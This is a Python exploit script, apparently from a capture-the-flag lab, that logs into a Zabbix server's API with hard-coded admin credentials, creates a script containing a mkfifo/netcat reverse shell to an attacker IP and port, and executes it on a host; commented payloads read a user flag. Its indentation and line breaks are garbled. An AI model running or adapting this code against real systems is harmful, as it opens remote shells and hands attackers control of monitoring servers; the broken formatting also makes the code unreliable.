import urllib.request
import json
import random
IP = '10.10.14.53'
PORT = 9005
HOST_ID = 10106
PAYLOAD = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + IP + " "
+ str(PORT) + " >/tmp/f &"
# PAYLOAD = "su zapper -p zapper && cat /home/zapper/user.txt"
# PAYLOAD = "hostname && ls -la /home/zapper && ls -la /backups"

class Zabbix():
   URL = 'http://10.10.10.108/zabbix/api_jsonrpc.php'
   login_json = {
      "jsonrpc": "2.0",
      "method": "user.login",
      "params": {
         "user": "Admin",
         "password": "f.YMeMd$pTbpY3-449"
      },
      "id": 1
    }
   def __init__(self):
      self.host_id = HOST_ID
      self.auth = self.make_request(self.login_json)['result']

	  self.hosts = {
	  "jsonrpc": "2.0",
	  "method": "host.get",
	  "params": {
	  "output": [
	     "hostid",
		 "host"
      ],
      "selectInterfaces": [
         "interfaceid",
         "ip"
      ]
   },
   "auth": self.auth,
   "id": 1
}
res_hosts = self.make_request(self.hosts)
print(res_hosts)

self.payload = {
   "jsonrpc": "2.0",
   "method": "script.create",
   "params": {
      "name": "RevShell-" + str(random.randint(0,100)),
	  "command": PAYLOAD,
	  "host_access": 10000,
	  "execute_on": 0,
	  "confirmation": "Are you sure you would like to exploit the
server?"
   },
   "auth": self.auth,
   "id": 1
}
res = self.make_request(self.payload)
self.script_id = res['result']['scriptids'][0]

print("### RUNNING SCRIPT ###")
self.run_script = {
   "jsonrpc": "2.0",
   "method": "script.execute",
   "params": {
      "scriptid": str(self.script_id),
      "hostid": int(self.host_id)
   },
   "auth": self.auth,
   "id": 1
}
res = self.make_request(self.run_script)
print(res)
	def make_request(self, j):
	   req = urllib.request.Request(self.URL)
	   req.add_header('Content-Type', 'application/json; charset=utf-8')
	   jsondata = json.dumps(j)
	   jsondata = jsondata.encode('utf-8')
	   req.add_header('Content-Length', len(jsondata))
	   response = urllib.request.urlopen(req, jsondata)
return json.loads(response.read())
if __name__ == '__main__':
   z = Zabbix()
